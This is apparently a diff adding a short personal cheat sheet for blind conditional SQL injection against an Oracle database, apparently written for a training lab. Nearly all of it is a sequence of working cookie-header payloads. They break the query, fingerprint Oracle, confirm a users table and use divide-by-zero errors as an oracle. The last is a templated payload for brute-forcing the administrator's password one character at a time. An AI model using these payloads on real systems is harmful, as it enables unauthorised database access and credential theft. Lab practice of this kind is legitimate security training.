@@ -1,0 +1,45 @@
+
+[ WEB > SQLI > ORACLE > BLIND CONDITIONAL ]
+
+// Test for sqli with single quote to break query
+Cookie: TrackingId=ZdU01SUVgygfpnWR';
+
+// Test correct error by closing quote
+Cookie: TrackingId=ZdU01SUVgygfpnWR'';
+
+// Verify that SQL is executing, and you're not just triggering/correcting random errors...
+// Trying MySQL syntax...
+Cookie: TrackingId=ZdU01SUVgygfpnWR'||(select '')||';
+
+// Try with Oracle syntax instead...
+Cookie: TrackingId=ZdU01SUVgygfpnWR'||(select '' from dual)||';
+
+// Verify Oracle by submitting invalid query
+Cookie: TrackingId=ZdU01SUVgygfpnWR'||(select '' from invalidtablename)||';
+
+// Query table...
+Cookie: TrackingId=ZdU01SUVgygfpnWR'||(select '' from users where rownum = 1)||';
+
+// Test conditions. Setup and test initial payload...
+// This statement *should* throw an error because divide by zero in logic.
+Cookie: TrackingId=ZdU01SUVgygfpnWR'||(select case when (1=1) then to_char(1/0) else '' end from dual)||';
+
+// Now test a condition that should trigger success:
+Cookie: TrackingId=ZdU01SUVgygfpnWR'||(select case when (1=2) then to_char(1/0) else '' end from dual)||';
+
+// See if record exists...
+Cookie: TrackingId=ZdU01SUVgygfpnWR'||(select '' from users where username = 'administrator')||';
+
+// Check password length
+Cookie: TrackingId=ZdU01SUVgygfpnWR'||(select case when length(password)>1 then '' else to_char(1/0) end from users where username = 'administrator')||';
+
+// Confirm exact length
+Cookie: TrackingId=ZdU01SUVgygfpnWR'||(select case when length(password)=20 then '' else to_char(1/0) end from users where username = 'administrator')||';
+
+// Brute force the password
+// Server should throw 500 for every response except for when the guess is correct...
+// When correct, a 200 should get returned...
+Cookie: TrackingId=ZdU01SUVgygfpnWR'||(select case when substr(password, {char_pos}, 1)='{char_guess}' then '' else to_char(1/0) end from users where username = 'administrator')||';
+
+
+
